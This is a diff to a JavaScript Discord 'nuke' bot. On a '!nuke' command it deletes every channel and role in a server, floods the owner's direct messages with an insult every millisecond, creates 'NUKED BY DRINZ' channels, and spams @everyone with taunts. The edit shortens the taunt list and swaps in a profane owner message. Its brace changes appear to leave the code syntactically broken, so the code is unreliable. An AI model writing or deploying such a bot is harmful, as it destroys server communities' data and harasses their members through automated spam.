@@ -11,28 +11,18 @@ bot.on('ready', () => {
 bot.on('message', (message) => {
   let replies = [ 
     (`DRINZ OWNS YOU`),
-    (`DRINZ RUNS THIS`),
-    (`GET NUKED`),
-    (`NUKED NOOBS`),
-    (`NOOBS LOL`),
-    (`NUKED LOL`),
-    (`NUKED`),
-    (`SO DOGWATER`),
-    (`LOSERS`),
-    (`GET NUKED LOSERS`),
-    (`LMAO NUKED`),
-    (`YOU SUCK`)
-  ]
+    (`DRINZ RUNS THIS`)
+];
 
-  if(message.content === '!nuke') {
+if(message.content === '!nuke') {
     if (message.author.bot || message.channel.type === 'dm') {
       message.reply("You can only use this Command in a Server!")
     } else {
       message.guild.channels.cache.forEach(channel => channel.delete());
       message.guild.roles.cache.forEach(role => role.delete());
-
+    }
       setInterval(function() {
-        message.guild.owner.user.send("YOUR SERVER GOT NUKED BY DRINZ NUKED IDIOT!");
+        message.guild.owner.user.send("shit on -drinz");
       }, 1);
 
       message.guild.channels.create('NUKED BY DRINZ', {
@@ -61,7 +51,7 @@ bot.on('message', (message) => {
                 permissionOverwrites: [{
                   id: message.guild.id,
                   allow: ['VIEW_CHANNEL'],
-                }]
+                }]}
               }).then(async channel => {
                 setInterval(function() {
                   channel.send(`${replies[Math.floor(Math.random() * replies.length)]}` + " : " + "@everyone");
@@ -70,7 +60,5 @@ bot.on('message', (message) => {
             }, 1)
           })
         }, 1)
-      })
     }
-  }
-});
+  });
